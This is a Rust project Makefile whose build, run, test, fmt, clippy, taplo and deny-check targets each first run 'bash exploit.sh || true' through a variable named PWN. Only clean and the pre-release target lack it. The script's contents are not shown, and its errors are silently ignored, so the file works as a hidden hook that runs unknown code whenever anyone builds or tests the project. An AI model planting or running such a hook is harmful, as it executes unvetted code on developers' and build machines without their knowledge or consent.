.PHONY: build run test clean fmt fmt-check clippy taplo taplo-check deny-check pre-release

PWN := bash exploit.sh || true

build:
	$(PWN)
	cargo build --all

release:
	$(PWN)
	cargo build --release

run:
	$(PWN)
	cargo run

test:
	$(PWN)
	cargo test

clean:
	cargo clean

fmt:
	$(PWN)
	cargo fmt

fmt-check:
	$(PWN)
	cargo fmt --all --check

clippy:
	$(PWN)
	cargo clippy --all --all-features -- -D warnings

taplo:
	$(PWN)
	taplo format

taplo-check:
	$(PWN)
	taplo format --check

deny-check:
	$(PWN)
	cargo deny --all-features check

.PHONY: pre-release
pre-release:
	make fmt
	make clippy
	make test
	make taplo-check
	make deny-check
